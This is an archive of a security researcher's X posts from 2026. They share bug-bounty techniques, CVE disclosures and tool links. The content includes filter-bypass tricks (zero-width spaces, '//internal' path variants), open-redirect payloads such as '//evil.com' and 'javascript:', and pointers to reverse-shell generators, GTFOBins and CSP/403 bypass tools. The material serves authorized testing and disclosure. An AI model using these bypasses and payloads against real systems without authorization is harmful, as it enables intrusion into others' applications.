**Links in post:** https://www.youtube.com/watch?v=6j177rW8-nA


---

## 2026-08-12 · Thread · Got an arbitrary file write that got closed as medium? It shouldn't have been.


Tags (automatic): RCE


### Post — @0xacb — 2026-08-12 09:43 UTC (2026-08-12 10:43 WAT)

- URL: https://x.com/0xacb/status/2087475037833928908
- Metrics (at fetch): bookmark 79, impression 7204, like 104, quote 1, reply 2, retweet 21

> Got an arbitrary file write that got closed as medium? It shouldn't have been.
>
> Most AFWs get downgraded because nobody could prove RCE 🥷
>
> Some research we've been doing for years just dropped! Write Once, Shell Everywhere: Turning Arbitrary File Writes into RCE - Our talk from


### Thread part 2 — @0xacb — 2026-08-12 09:43 UTC (2026-08-12 10:43 WAT)

- URL: https://x.com/0xacb/status/2087475039159357895
- Metrics (at fetch): bookmark 0, impression 692, like 0, quote 0, reply 1, retweet 0

> Most of the public AFW to RCE techniques assume cron, sshd, systemd, someone eventually logging in.
>
> None of that exists in a stripped container, which came up in multiple bug bounty scenarios (path traversal write, zip slip, etc)
>
> So we went looking for what was missing.


---

## 2026-08-08 · Post · libvips has flagged matload as untrusted for years and exposes a switch to block it. Rails’ ActiveSt


Tags (automatic): RCE


### Post — @0xacb — 2026-08-08 10:05 UTC (2026-08-08 11:05 WAT)

- URL: https://x.com/0xacb/status/2086031112178946555
- Metrics (at fetch): bookmark 8, impression 1974, like 17, quote 0, reply 0, retweet 3

> libvips has flagged matload as untrusted for years and exposes a switch to block it. Rails’ ActiveStorage just never flipped it. Until last week.
>
> That’s CVE-2026-66066: a .mat file declared as image/png, arbitrary file read, then RCE.
>
> Full chain👇
>
> https://t.co/oBZHuuF7Uh


---

## 2026-08-08 · Post · libvips has flagged matload as untrusted for years and exposes a switch to block it. Rails’ ActiveSt


Tags (automatic): RCE


### Post — @0xacb — 2026-08-08 10:05 UTC (2026-08-08 11:05 WAT)

- URL: https://x.com/0xacb/status/2086030984307261917
- Metrics (at fetch): bookmark 0, impression 175, like 0, quote 0, reply 0, retweet 0

> libvips has flagged matload as untrusted for years and exposes a switch to block it. Rails’ ActiveStorage just never flipped it. Until last week.
>
> That’s CVE-2026-66066: a .mat file declared as image/png, arbitrary file read, then RCE as root.
>
> Full chain👇


---

## 2026-07-29 · Thread · 🚨We reported KindaRails2Shell, a critical RCE in Ruby on Rails via Active Storage.


Tags (automatic): RCE


### Post — @0xacb — 2026-07-29 15:13 UTC (2026-07-29 16:13 WAT)

- URL: https://x.com/0xacb/status/2082484609820823929
- Metrics (at fetch): bookmark 192, impression 91215, like 388, quote 10, reply 13, retweet 99

> 🚨We reported KindaRails2Shell, a critical RCE in Ruby on Rails via Active Storage.
>
> It’s not a one-shot RCE, but the preconditions are kinda common under default configurations.
>
> Patch your applications now!
>
> https://t.co/Cj9XDk3qTN


### Thread part 2 — @0xacb — 2026-07-29 15:13 UTC (2026-07-29 16:13 WAT)

- URL: https://x.com/0xacb/status/2082484611536269560
- Metrics (at fetch): bookmark 1, impression 3848, like 12, quote 0, reply 2, retweet 0

> Shout-out to @ryotkak and @flatt_security for also reporting this and helping coordinate the disclosure.


### Thread part 3 — @0xacb — 2026-07-29 15:22 UTC (2026-07-29 16:22 WAT)

- URL: https://x.com/0xacb/status/2082486952683556896
- Metrics (at fetch): bookmark 2, impression 2679, like 6, quote 0, reply 1, retweet 0

> @ryotkak @flatt_security CVE-2026-66066


---

## 2026-07-24 · Post · Nice finding @pcuco92 🔥 https://t.co/RGYcJ5t8hW


### Post — @0xacb — 2026-07-24 16:27 UTC (2026-07-24 17:27 WAT)

- URL: https://x.com/0xacb/status/2080691351071474025
- Metrics (at fetch): bookmark 6, impression 3475, like 20, quote 0, reply 1, retweet 0

> Nice finding @pcuco92 🔥 https://t.co/RGYcJ5t8hW

**Quoted post** 2080601548841689252: not readable via the API (deleted, private, or withheld).


---

## 2026-07-20 · Post · Are you familiar with zero-width space?


### Post — @0xacb — 2026-07-20 17:31 UTC (2026-07-20 18:31 WAT)

- URL: https://x.com/0xacb/status/2079257935801188403
- Metrics (at fetch): bookmark 232, impression 9839, like 196, quote 0, reply 7, retweet 20

> Are you familiar with zero-width space?
>
> This character 👉 %E2%80%8B
>
> Try inserting %E2%80%8B between characters of a blocked word. If the filter sees a different string, and the backend ignores the invisible character, you may bypass some filters.
>
> Some string-contains filters


---

## 2026-07-15 · Thread · Which AI pentesting agent is the best in the world? And how can we even measure this? (We figured it


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-07-15 09:03 UTC (2026-07-15 10:03 WAT)

- URL: https://x.com/0xacb/status/2077318044452376591
- Metrics (at fetch): bookmark 57, impression 13128, like 62, quote 2, reply 3, retweet 9

> Which AI pentesting agent is the best in the world? And how can we even measure this? (We figured it out! Keep reading 👇)
>
> The existing benchmarking methods ain't good because they work like a CTF, which doesn't resemble real-world vulns.
>
> An agent that is terrible at finding real-world vulns can ace a CTF-style benchmark, and an agent that's great at finding real-world vulns could be underscored. In our own work, gains on controlled benchmarks didn't reliably carry over to real engagements, which is exactly what pushed us to build this.
>
> So we designed a whole new benchmarking methodology (along with a research paper) that works by assessing the agent's ability to find bugs in real-world applications.
>
> We think this is a stronger foundation for testing the efficacy and accuracy of pentesting agents.
>
> We made the benchmark methodology open source (along with the paper, if you're interested!) and we ranked existing agents👇


### Thread part 2 — @0xacb — 2026-07-15 09:48 UTC (2026-07-15 10:48 WAT)

- URL: https://x.com/0xacb/status/2077329476292055218
- Metrics (at fetch): bookmark 33, impression 2013, like 22, quote 1, reply 2, retweet 4

> Check here for full details 👇
>
> https://ethiack.com/info-hub/research/evaluating-pentesting-agents-part-1

**Links in post:** https://ethiack.com/info-hub/research/evaluating-pentesting-agents-part-1


---

## 2026-07-14 · Post · Blog post: https://ethiack.com/info-hub/research/evaluating-pentesting-agents-part-1


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-07-14 14:31 UTC (2026-07-14 15:31 WAT)

- URL: https://x.com/0xacb/status/2077038187491332526
- Metrics (at fetch): bookmark 14, impression 1737, like 16, quote 0, reply 1, retweet 3

> Blog post: https://ethiack.com/info-hub/research/evaluating-pentesting-agents-part-1

**Links in post:** https://ethiack.com/info-hub/research/evaluating-pentesting-agents-part-1


---

## 2026-07-13 · Post · Revshells is a great tool for quickly generating shell payloads according to your needs.


### Post — @0xacb — 2026-07-13 14:08 UTC (2026-07-13 15:08 WAT)

- URL: https://x.com/0xacb/status/2076670009342853311
- Metrics (at fetch): bookmark 6, impression 2321, like 23, quote 0, reply 0, retweet 5

> Revshells is a great tool for quickly generating shell payloads according to your needs.
>
> It supports reverse shells, bind shells, msfvenom payloads, HoaxShell, and assembled payload options.
>
> You can generate payloads for multiple operating systems and languages, and customize [pic.x.com/hMm5k3MyqJ]

**Media:**
- photo: https://pbs.twimg.com/media/HNHQQEcXUAAiVpa.jpg — no alt text provided by author


---

## 2026-07-03 · Thread · Most recon stops at A records, and that's where some attack surface hides.


### Post — @0xacb — 2026-07-03 13:09 UTC (2026-07-03 14:09 WAT)

- URL: https://x.com/0xacb/status/2073031497490076003
- Metrics (at fetch): bookmark 74, impression 9886, like 75, quote 1, reply 4, retweet 6

> Most recon stops at A records, and that's where some attack surface hides.
>
> Querying all DNS records allows you to expand your recon.
>
> 🧑‍💻 CNAME records can reveal third-party services and subdomain takeover opportunities
> 🧑‍💻 MX records expose mail infrastructure
> 🧑‍💻 NS records show who actually controls the zone and reveal DNS takeover opportunities
> 🧑‍💻 TXT records often leak SPF/DKIM setups, internal tooling, and verification tokens for SaaS platforms the target uses
>
> You can easily run all of these checks using DNSx, like this 👇
>
> ~$ echo ethiack[.]com | dnsx -recon

**Media:**
- photo: https://pbs.twimg.com/media/HMTjCzkWQAAoTUx.jpg — no alt text provided by author


### Thread part 2 — @0xacb — 2026-07-03 13:09 UTC (2026-07-03 14:09 WAT)

- URL: https://x.com/0xacb/status/2073031499549458434
- Metrics (at fetch): bookmark 7, impression 928, like 7, quote 0, reply 1, retweet 1

> Tool:
> https://github.com/projectdiscovery/dnsx

**Links in post:** https://github.com/projectdiscovery/dnsx


---

## 2026-06-23 · Post · Here's a quick one-liner for finding open redirects to chain with something more impactful.


### Post — @0xacb — 2026-06-23 16:42 UTC (2026-06-23 17:42 WAT)

- URL: https://x.com/0xacb/status/2069460993076232702
- Metrics (at fetch): bookmark 111, impression 5824, like 124, quote 0, reply 2, retweet 14

> Here's a quick one-liner for finding open redirects to chain with something more impactful.
>
> This will hit all archived URL variants, replace parameter values with your payload, and confirm live redirects using HTTPX response matching.
>
> Full command:
> ~$ gau --threads 5 [pic.x.com/imVCCjtvDl]

**Media:**
- photo: https://pbs.twimg.com/media/HLgzsMdWYAAqAEy.jpg — no alt text provided by author


---

## 2026-06-22 · Post · We've all been there: found an XSS, blocked by CSP.


Tags (automatic): XSS, CSP / CSPT


### Post — @0xacb — 2026-06-22 14:08 UTC (2026-06-22 15:08 WAT)

- URL: https://x.com/0xacb/status/2069059907693768714
- Metrics (at fetch): bookmark 152, impression 9502, like 210, quote 0, reply 3, retweet 35

> We've all been there: found an XSS, blocked by CSP.
>
> There's a bunch of CSP bypasses that you can try by @renniepak:
> https://cspbypass.com
>
> It has a compilation of bypasses, based on the exact CSP you're up against. 
>
> Here’s a quick tutorial on how to use it 👇 [pic.x.com/YyocVJoNVF]

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2069059724100718592/pu/img/0q580W0Tb-Vt3HCn.jpg — no alt text provided by author

**Links in post:** https://cspbypass.com


---

## 2026-06-18 · Post · Here's a simple concept that's helped me find a lot of bugs. Once it clicks you can't unsee it.


Tags (automatic): XSS, SQL injection


### Post — @0xacb — 2026-06-18 09:09 UTC (2026-06-18 10:09 WAT)

- URL: https://x.com/0xacb/status/2067535207935131916
- Metrics (at fetch): bookmark 192, impression 12284, like 240, quote 2, reply 4, retweet 30

> Here's a simple concept that's helped me find a lot of bugs. Once it clicks you can't unsee it.
>
> A huge family of bugs is basically the same bug: two components read the same input and disagree about what it means.
>
> - Injection (XSS, SQLi, code injection): a parser (the browser,


---

## 2026-06-02 · Post · GTFOBins is a curated list of Unix binaries that may be exploited to bypass local security restricti


### Post — @0xacb — 2026-06-02 09:37 UTC (2026-06-02 10:37 WAT)

- URL: https://x.com/0xacb/status/2061743988802007545
- Metrics (at fetch): bookmark 11, impression 1624, like 19, quote 0, reply 2, retweet 0

> GTFOBins is a curated list of Unix binaries that may be exploited to bypass local security restrictions: SUID, sudo, capabilities, file read/write.
>
> On real targets you often land in a restricted shell, but those may help you escalate privileges, reading unauthorized files, etc


---

## 2026-05-12 · Post · Found an IDOR vulnerability but the IDs are UUIDs? Don't drop the report yet.


Tags (automatic): IDOR / BOLA


### Post — @0xacb — 2026-05-12 09:57 UTC (2026-05-12 10:57 WAT)

- URL: https://x.com/0xacb/status/2054138878030643596
- Metrics (at fetch): bookmark 171, impression 8894, like 203, quote 0, reply 3, retweet 31

> Found an IDOR vulnerability but the IDs are UUIDs? Don't drop the report yet.
>
> 1️⃣ Find leaked UUIDs
> - Use a tool like gau/waybackurl to dump URLs from that target, see if any valid UUIDs are leaked in the URLs and try them (be careful with write/delete operations ⚠️)
> - Search


---

## 2026-05-11 · Post · Submitting alert(document.location) will probably get you a medium. Proving impact can make a real d


Tags (automatic): XSS


### Post — @0xacb — 2026-05-11 09:03 UTC (2026-05-11 10:03 WAT)

- URL: https://x.com/0xacb/status/2053762914574586291
- Metrics (at fetch): bookmark 109, impression 6233, like 124, quote 0, reply 2, retweet 16

> Submitting alert(document.location) will probably get you a medium. Proving impact can make a real difference. Escalating an XSS used to be as easy as leaking cookies. That often doesn't work anymore because the HttpOnly flag is typically present on the juicy session cookies.


---

## 2026-05-07 · Post · Are you getting a forbidden status code hitting a sensitive endpoint on a Node.js app? It may be usi


Tags (automatic): Path normalization


### Post — @0xacb — 2026-05-07 12:20 UTC (2026-05-07 13:20 WAT)

- URL: https://x.com/0xacb/status/2052362953421111546
- Metrics (at fetch): bookmark 84, impression 5197, like 101, quote 0, reply 0, retweet 13

> Are you getting a forbidden status code hitting a sensitive endpoint on a Node.js app? It may be using Fastify.
>
> The middleware may check the exact path, e.g. /internal. If the app has router normalization options enabled, the following or variations may work:
>
> //internal


---

## 2026-05-06 · Post · A lot of people are now building and using their own hackbots daily. Here's a nice blog on using AI 


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-05-06 12:07 UTC (2026-05-06 13:07 WAT)

- URL: https://x.com/0xacb/status/2051997259978465780
- Metrics (at fetch): bookmark 322, impression 12094, like 288, quote 0, reply 3, retweet 66

> A lot of people are now building and using their own hackbots daily. Here's a nice blog on using AI to hunt for vulns by @0xAsm0d3us.
>
> Some takeaways that I've also been experiencing:
>
> &gt; Instead of asking "is this code secure?", ask "how would you break this?". This shifts the


---

## 2026-04-27 · Post · You're attacking an OAuth implementation, but it properly validates if the redirect_uri starts with 


Tags (automatic): OAuth


### Post — @0xacb — 2026-04-27 11:43 UTC (2026-04-27 12:43 WAT)

- URL: https://x.com/0xacb/status/2048729722817765868
- Metrics (at fetch): bookmark 125, impression 7014, like 154, quote 0, reply 1, retweet 26

> You're attacking an OAuth implementation, but it properly validates if the redirect_uri starts with https://t.co/iP6Wq9tG2W - are we cooked? Not necessarily. 
>
> We should still check if it enforces strict path matching. 
>
> Since you can’t redirect to your own domain, how about


---

## 2026-04-08 · Post · CI/CD pipelines provide a lot of juicy attack surface.


### Post — @0xacb — 2026-04-08 10:41 UTC (2026-04-08 11:41 WAT)

- URL: https://x.com/0xacb/status/2041828758798114983
- Metrics (at fetch): bookmark 29, impression 2276, like 35, quote 0, reply 1, retweet 7

> CI/CD pipelines provide a lot of juicy attack surface.
>
> One common pattern: a build system lets you specify an output path for artifacts. If that path isn't sanitized, a ../ sequence lets you write files anywhere on the build server. With AFW, you can create a cronjob,


---

## 2026-04-05 · Thread · Reverse engineering MCPs like IDA Pro MCP or Ghidra MCP are really powerful to find memory corruptio


Tags (automatic): Memory corruption / native, AI-assisted hunting


### Post — @0xacb — 2026-04-05 10:47 UTC (2026-04-05 11:47 WAT)

- URL: https://x.com/0xacb/status/2040743087526355330
- Metrics (at fetch): bookmark 92, impression 6096, like 105, quote 0, reply 3, retweet 12

> Reverse engineering MCPs like IDA Pro MCP or Ghidra MCP are really powerful to find memory corruption 0days or reversing CVEs.
>
> Here's what I usually ask:
>
> - Find unsafe memory operations like strcpy, memcpy and check for overflows
> - How to reach the vulnerable function?
> - Build a simple PoC to attempt to trigger it (or generate fuzzing inputs)
>
> We still have deterministic tools to detect these, like Angr, which can also solve how to reach a specific function in specific cases, but LLMs can reason about context, where data comes from and how it flows, which makes them faster and complementary for larger binaries or libraries.


### Thread part 2 — @0xacb — 2026-04-05 10:47 UTC (2026-04-05 11:47 WAT)

- URL: https://x.com/0xacb/status/2040743088558100773
- Metrics (at fetch): bookmark 7, impression 892, like 8, quote 0, reply 0, retweet 2

> https://github.com/mrexodia/ida-pro-mcp

**Links in post:** https://github.com/mrexodia/ida-pro-mcp


---

## 2026-04-04 · Post · If you're up against a GraphQL endpoint, InQL is great.


### Post — @0xacb — 2026-04-04 10:33 UTC (2026-04-04 11:33 WAT)

- URL: https://x.com/0xacb/status/2040377172850782478
- Metrics (at fetch): bookmark 59, impression 3338, like 75, quote 0, reply 0, retweet 8

> If you're up against a GraphQL endpoint, InQL is great.
>
> Introspection parsing, query generation, batch attack testing. It can map the entire attack surface of a GraphQL API. Works as a Burp extension or standalone CLI.
>
> You can also pair it with graphql-voyager for visual schema


---

## 2026-04-01 · Post · Hackerone MCP Server (unofficial).


Tags (automatic): Platform: HackerOne


### Post — @0xacb — 2026-04-01 11:20 UTC (2026-04-01 12:20 WAT)

- URL: https://x.com/0xacb/status/2039301886906405011
- Metrics (at fetch): bookmark 95, impression 7038, like 123, quote 1, reply 3, retweet 16

> Hackerone MCP Server (unofficial).
>
> An MCP server that gives you quick access to your HackerOne reports, programs, earnings, and scope data.
>
> Very useful tool by @OriginalSicksec for anyone that's automating but bounty hunting.
>
> GitHub repo 👇
> https://t.co/2as8qVc2FP


---

## 2026-03-23 · Post · I keep finding GraphQL batching bugs out there. Here's how to find them 👇


### Post — @0xacb — 2026-03-23 08:54 UTC (2026-03-23 09:54 WAT)

- URL: https://x.com/0xacb/status/2036003602875990153
- Metrics (at fetch): bookmark 244, impression 12565, like 269, quote 1, reply 5, retweet 44

> I keep finding GraphQL batching bugs out there. Here's how to find them 👇
>
> Most GraphQL endpoints accept arrays of operations in a single HTTP request. So instead of sending one login request at a time (and getting rate limited after 5 attempts), you send 1000 login mutations in


---

## 2026-03-20 · Post · Attribute injection blocked by a server filter, no script tags allowed, should've been a dead end.


Tags (automatic): XSS, CSP / CSPT


### Post — @0xacb — 2026-03-20 10:37 UTC (2026-03-20 11:37 WAT)

- URL: https://x.com/0xacb/status/2034942375433261300
- Metrics (at fetch): bookmark 49, impression 3277, like 54, quote 0, reply 1, retweet 8

> Attribute injection blocked by a server filter, no script tags allowed, should've been a dead end.
>
> Instead: jQuery's .val() decodes HTML entities &gt; ReCAPTCHA gadget calls a function &gt; DOM clobbering hijacks the selector &gt; iframe srcdoc bypasses CSP &gt; XSS.
>
> Real bugs hit


---

## 2026-03-19 · Post · A researcher found an Instagram vuln letting anyone access Note videos with audio that should've bee


### Post — @0xacb — 2026-03-19 10:09 UTC (2026-03-19 11:09 WAT)

- URL: https://x.com/0xacb/status/2034572848514187274
- Metrics (at fetch): bookmark 325, impression 63802, like 612, quote 1, reply 12, retweet 43

> A researcher found an Instagram vuln letting anyone access Note videos with audio that should've been silent by default. Just by paying attention and using Devtools :)
>
> Meta paid $1000 for this finding.
>
> https://t.co/fylbXBEe76
>
> Video credits: i12gocaj https://t.co/7hDADAgyU3

**Media:**
- video: https://pbs.twimg.com/ext_tw_video_thumb/2034572696441282560/pu/img/1SHuvDwYlz0HS1Y4.jpg — no alt text provided by author


---

## 2026-03-18 · Post · Super cool work by @s3bsrt


### Post — @0xacb — 2026-03-18 11:30 UTC (2026-03-18 12:30 WAT)

- URL: https://x.com/0xacb/status/2034230986351784411
- Metrics (at fetch): bookmark 88, impression 5533, like 121, quote 1, reply 0, retweet 27

> Super cool work by @s3bsrt
>
> HTTP trailers can be a blind spot. Proxies usually ignore them, but backend servers will happily merge them into the main headers, letting you sneak payloads right past security filters.
>
> Blog link 👇
> https://t.co/gpLb4G2Ksm


---

## 2026-03-17 · Post · Parser Differentials by @joernchen


### Post — @0xacb — 2026-03-17 12:04 UTC (2026-03-17 13:04 WAT)

- URL: https://x.com/0xacb/status/2033877183836413958
- Metrics (at fetch): bookmark 65, impression 6551, like 85, quote 2, reply 1, retweet 10

> Parser Differentials by @joernchen
> #10 in PortSwigger Web Hacking Techniques of 2025
>
> This technique takes advantage of the disagreement of two different components (like a load balancer and backend app) on their interpretation of the exact same data.
>
> Worthy of a deep


---

## 2026-03-15 · Post · Fascinating account takeover chain discovered in Facebook mobile app by @samm0uda


Tags (automatic): XSS, Account takeover


### Post — @0xacb — 2026-03-15 19:02 UTC (2026-03-15 20:02 WAT)

- URL: https://x.com/0xacb/status/2033257620417442117
- Metrics (at fetch): bookmark 104, impression 7798, like 168, quote 0, reply 2, retweet 18

> Fascinating account takeover chain discovered in Facebook mobile app by @samm0uda
>
> Multiple vulnerabilities combined:
> * Predictable random numbers
> * XSS in the JavaScript SDK
> * Frame protection bypass
> * Login CSRF
>
> One malicious link = full account compromise
>
> Meta paid a $66k


---

## 2026-03-13 · Post · WontFix can be an RCE Goldmine


Tags (automatic): RCE


### Post — @0xacb — 2026-03-13 11:02 UTC (2026-03-13 12:02 WAT)

- URL: https://x.com/0xacb/status/2032411931949097177
- Metrics (at fetch): bookmark 146, impression 13151, like 174, quote 0, reply 1, retweet 51

> WontFix can be an RCE Goldmine
>
> SOAPwn by @chudyPB
>
> #5 in PortSwigger Web Hacking Techniques of 2025
>
> Microsoft’s refusal to patch HttpWebClientProtocol invalid casting makes any .NET app using ServiceDescriptionImporter permanently vulnerable to arbitrary file write via


---

## 2026-03-12 · Post · The ETag Oracle


Tags (automatic): Memory corruption / native


### Post — @0xacb — 2026-03-12 11:03 UTC (2026-03-12 12:03 WAT)

- URL: https://x.com/0xacb/status/2032049881183908014
- Metrics (at fetch): bookmark 31, impression 2478, like 55, quote 0, reply 0, retweet 2

> The ETag Oracle
>
> Cross-Site ETag Length Leak by @arkark_
>
> This technique weaponizes 1-byte ETag length variations to trigger 431 header overflows, detectable via Chromium's history API. It proves XS-Leaks remain viable without HTML injection by turning caching metadata into a


---

## 2026-03-11 · Post · A really nice Cross-Site Leak writeup. 


Tags (automatic): XSS


### Post — @0xacb — 2026-03-11 15:07 UTC (2026-03-11 16:07 WAT)

- URL: https://x.com/0xacb/status/2031748845823013144
- Metrics (at fetch): bookmark 101, impression 6261, like 139, quote 0, reply 1, retweet 20

> A really nice Cross-Site Leak writeup. 
>
> XSS-Leak by @salvatoreabello
>
> For client-side hackers, you would love this in your arsenal because it relies on browser architecture (Chromium) rather than a specific implementation bug in a website. Since Google marked it "WAI" (Works As


---

## 2026-03-06 · Post · This blog site of @samm0uda is a treasure trove of everything Meta (Facebook, Instagram, Oculus) hac


### Post — @0xacb — 2026-03-06 15:04 UTC (2026-03-06 16:04 WAT)

- URL: https://x.com/0xacb/status/2029936254939275563
- Metrics (at fetch): bookmark 40, impression 2754, like 48, quote 0, reply 0, retweet 6

> This blog site of @samm0uda is a treasure trove of everything Meta (Facebook, Instagram, Oculus) hacking 👇
> https://t.co/Q97nGsyh5t


---

## 2026-03-05 · Post · Next.js, cache, and chains: The Stale Elixir


### Post — @0xacb — 2026-03-05 11:03 UTC (2026-03-05 12:03 WAT)

- URL: https://x.com/0xacb/status/2029513115910459874
- Metrics (at fetch): bookmark 53, impression 4639, like 86, quote 0, reply 0, retweet 11

> Next.js, cache, and chains: The Stale Elixir
>
> A nice work by @zhero___
>
> This zero day brought web cache poisoning to the spotlight. His extensive research showed how source code analysis helped him craft a technique that resulted to CVE-2024-46982.
>
> Blog link 👇


---

## 2026-03-03 · Post · Playing with HTTP/2 CONNECT by @flomb_


### Post — @0xacb — 2026-03-03 14:35 UTC (2026-03-03 15:35 WAT)

- URL: https://x.com/0xacb/status/2028841686466482490
- Metrics (at fetch): bookmark 36, impression 3299, like 63, quote 0, reply 1, retweet 9

> Playing with HTTP/2 CONNECT by @flomb_
>
> This research explores how HTTP/2 CONNECT can be utilized for port scanning. It may also bypass traditional network inspection tools, which opens up a lot of possibilities.
>
> Check the blog for more details 👇
> https://t.co/uTehr25zEu


---

## 2026-03-02 · Post · Many people overlook Android hacking due to the challenges associated with configuring emulators and


Tags (automatic): Mobile / Android / iOS, Platform: Bugcrowd


### Post — @0xacb — 2026-03-02 17:05 UTC (2026-03-02 18:05 WAT)

- URL: https://x.com/0xacb/status/2028517063493402912
- Metrics (at fetch): bookmark 181, impression 6759, like 165, quote 0, reply 2, retweet 29

> Many people overlook Android hacking due to the challenges associated with configuring emulators and proxies.
>
> Thankfully, there's a comprehensive guide from @bugcrowd that walks you through the setup process, making it much easier to get started with mobile hacking!


---

## 2026-02-28 · Post · Tired of hitting 403 errors during your security testing? 


### Post — @0xacb — 2026-02-28 11:32 UTC (2026-02-28 12:32 WAT)

- URL: https://x.com/0xacb/status/2027708446544380089
- Metrics (at fetch): bookmark 271, impression 10730, like 244, quote 0, reply 3, retweet 45

> Tired of hitting 403 errors during your security testing? 
>
> NoMore403 by @devploit automates bypass techniques to get past those pesky restrictions. 
>
> Try it at 👇
> https://t.co/kX3a0oFGxO


---

## 2026-02-27 · Post · CewlAI by @rez0__ takes your domains, learns the naming patterns, and generates new variations using


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-02-27 11:05 UTC (2026-02-27 12:05 WAT)

- URL: https://x.com/0xacb/status/2027339310400147681
- Metrics (at fetch): bookmark 188, impression 11152, like 178, quote 2, reply 5, retweet 26

> CewlAI by @rez0__ takes your domains, learns the naming patterns, and generates new variations using Gemini, OpenAI, WhiteRabbitNeo, or a local Ollama model.
>
> It's great to expand recon and improve permutations👇
>
> https://t.co/YRJq9dfNFd


---

## 2026-02-26 · Post · Quick web hacking tip: when you see a harmless redirect param (?next= / ?url= / ?return=) here are s


Tags (automatic): Request smuggling / desync


### Post — @0xacb — 2026-02-26 10:33 UTC (2026-02-26 11:33 WAT)

- URL: https://x.com/0xacb/status/2026968837241901431
- Metrics (at fetch): bookmark 171, impression 6666, like 153, quote 0, reply 0, retweet 24

> Quick web hacking tip: when you see a harmless redirect param (?next= / ?url= / ?return=) here are some things you can try.
>
> Checklist:
> - Allowlist vs blocklist? (regex = yellow flag)
> - Scheme smuggling: //evil.com, \\https://t.co/l09TantStH, javascript:
> - Host confusion:


---

## 2026-02-25 · Post · IDOR hunting workflow I keep coming back to:


Tags (automatic): IDOR / BOLA


### Post — @0xacb — 2026-02-25 10:30 UTC (2026-02-25 11:30 WAT)

- URL: https://x.com/0xacb/status/2026605764446499256
- Metrics (at fetch): bookmark 309, impression 12956, like 320, quote 0, reply 5, retweet 39

> IDOR hunting workflow I keep coming back to:
>
> 1) Map object IDs (UUIDs, ints, slugs) across endpoints (REST + GraphQL).
> 2) Change one dimension at a time: user_id, org_id, project_id.
> 3) Watch for soft failures: 200 with partial data, empty arrays, unexpected responses.
> 4) Test


---

## 2026-02-24 · Post · Vulnerability Spoiler Alert Action by @spaceraccoonsec


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-02-24 10:35 UTC (2026-02-24 11:35 WAT)

- URL: https://x.com/0xacb/status/2026244570393055372
- Metrics (at fetch): bookmark 56, impression 5737, like 60, quote 0, reply 1, retweet 13

> Vulnerability Spoiler Alert Action by @spaceraccoonsec
>
> It monitors repositories and uses Claude to detect patching of security vulns. This early warning can give security teams more time to patch before the CVE drops.
>
> GitHub repo👇
> https://github.com/spaceraccoon/vulnerability-spoiler-alert-action

**Links in post:** https://github.com/spaceraccoon/vulnerability-spoiler-alert-action


---

## 2026-02-23 · Post · Hackian uncovered interesting business logic flaws in SonarQube and n8n.


### Post — @0xacb — 2026-02-23 17:41 UTC (2026-02-23 18:41 WAT)

- URL: https://x.com/0xacb/status/2025989393429692659
- Metrics (at fetch): bookmark 26, impression 2860, like 37, quote 0, reply 0, retweet 1

> Hackian uncovered interesting business logic flaws in SonarQube and n8n.
>
> Blog post by @pcuco92👇
>
> https://ethiack.com/news/product/hackian-ghosts-in-business-logic

**Links in post:** https://ethiack.com/news/product/hackian-ghosts-in-business-logic


---

## 2026-02-20 · Post · Did you know that you can subscribe to topics using RSS on Medium?


Tags (automatic): XSS


### Post — @0xacb — 2026-02-20 11:03 UTC (2026-02-20 12:03 WAT)

- URL: https://x.com/0xacb/status/2024802200556335253
- Metrics (at fetch): bookmark 30, impression 1985, like 21, quote 0, reply 2, retweet 1

> Did you know that you can subscribe to topics using RSS on Medium?
>
> For example, if you want to receive updates about cross-site scripting, simply use this link: 
>
> https://medium[.]com/feed/tag/cross-site-scripting 
>
> Replace "cross-site-scripting" with any other vulnerability


---

## 2026-02-19 · Post · ASN/CIDR lookups are massively underrated for recon.


### Post — @0xacb — 2026-02-19 16:13 UTC (2026-02-19 17:13 WAT)

- URL: https://x.com/0xacb/status/2024517695140475307
- Metrics (at fetch): bookmark 94, impression 6065, like 105, quote 0, reply 0, retweet 10

> ASN/CIDR lookups are massively underrated for recon.
>
> Start with a company name. Find all their assets. Get instant ASN to CIDR lookups, IP/DNS/ORG resolution, and JSON/CSV output 👇
>
> https://github.com/projectdiscovery/asnmap

**Links in post:** https://github.com/projectdiscovery/asnmap


---

## 2026-02-18 · Post · @wunderwuzzi23 Blog: https://ethiack.com/news/blog/agentic-problems-and-zombie-ai


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-02-18 14:34 UTC (2026-02-18 15:34 WAT)

- URL: https://x.com/0xacb/status/2024130311764705784
- Metrics (at fetch): bookmark 2, impression 750, like 3, quote 0, reply 0, retweet 1

> @wunderwuzzi23 Blog: https://ethiack.com/news/blog/agentic-problems-and-zombie-ai

**Links in post:** https://ethiack.com/news/blog/agentic-problems-and-zombie-ai


---

## 2026-02-14 · Post · GraphQL Introspection Bypass via Field Suggestions


### Post — @0xacb — 2026-02-14 12:04 UTC (2026-02-14 13:04 WAT)

- URL: https://x.com/0xacb/status/2022643073855951103
- Metrics (at fetch): bookmark 177, impression 7779, like 204, quote 0, reply 1, retweet 35

> GraphQL Introspection Bypass via Field Suggestions
>
> Even with introspection disabled, GraphQL APIs leak schema information through error messages.
>
> When introspection returns errors, exploit the suggestion feature:
> &gt; Send queries with intentional typos
> &gt; GraphQL suggests similar


---

## 2026-02-12 · Post · Exposing Instagram posts from private users. A writeup by @rub003 


### Post — @0xacb — 2026-02-12 11:02 UTC (2026-02-12 12:02 WAT)

- URL: https://x.com/0xacb/status/2021902700682604832
- Metrics (at fetch): bookmark 65, impression 4707, like 55, quote 0, reply 0, retweet 5

> Exposing Instagram posts from private users. A writeup by @rub003 
>
> https://003random.com/posts/meta-bountycon-instagram-writeup/

**Links in post:** https://003random.com/posts/meta-bountycon-instagram-writeup/


---

## 2026-02-10 · Post · Openclaw (Clawdbot) is cool and all but it’s also risky.


Tags (automatic): AI-assisted hunting


### Post — @0xacb — 2026-02-10 11:03 UTC (2026-02-10 12:03 WAT)

- URL: https://x.com/0xacb/status/2021178131399238107
- Metrics (at fetch): bookmark 9, impression 1676, like 17, quote 0, reply 1, retweet 1

> Openclaw (Clawdbot) is cool and all but it’s also risky.
>
> Make sure you get your bot audited with some better security practices 👇 
>
> https://auth0.com/blog/five-step-guide-securing-moltbot-ai-agent/
> https://docs.molt.bot/gateway/security

